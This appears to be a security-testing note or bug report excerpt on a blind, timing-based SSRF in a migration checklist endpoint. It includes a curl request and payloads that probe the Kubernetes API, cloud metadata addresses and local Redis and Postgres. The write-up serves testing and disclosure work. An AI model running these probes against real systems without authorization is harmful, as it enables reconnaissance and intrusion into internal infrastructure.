## Use case

The vulnerable feature was a migration checklist endpoint that accepted a connection URI in the POST body, allowing for server-side network connections. This was critical as it enabled an attacker to exploit SSRF to access internal services like the Kubernetes API and cloud metadata services.

## Steps to test

1. Identify an endpoint that accepts a URI for server-side connections, such as a migration checklist endpoint.
2. Establish a baseline response time using a known unreachable internal IP address (e.g., 10.0.0.1).
3. Send a POST request to the endpoint with a valid internal address (e.g., kubernetes.default.svc.cluster.local) in the connection_uri parameter.
4. Measure the response time and compare it to the baseline to determine if the internal address is reachable.

## Commands

```text
curl 'https://[REDACTED]/api/v2/migration/checklist' \
-H 'Cookie: keycloak_token=[YOUR_TOKEN]' \
-H 'Content-Type: application/json' \
-d '{"connection_uri":"postgres://x:x@10.0.0.1:5432/db"}' \
-w '\nTime: %{time_total}s\n'
-d '{"connection_uri":"postgres://x:x@kubernetes.default.svc.cluster.local:443/db"}'
-d '{"connection_uri":"postgres://x:x@169.254.169.254:80/db"}'
-d '{"connection_uri":"postgres://x:x@metadata.google.internal:80/db"}'
-d '{"connection_uri":"postgres://x:x@127.0.0.1:6379/db"}'
-d '{"connection_uri":"postgres://x:x@127.0.0.1:5432/db"}'
```
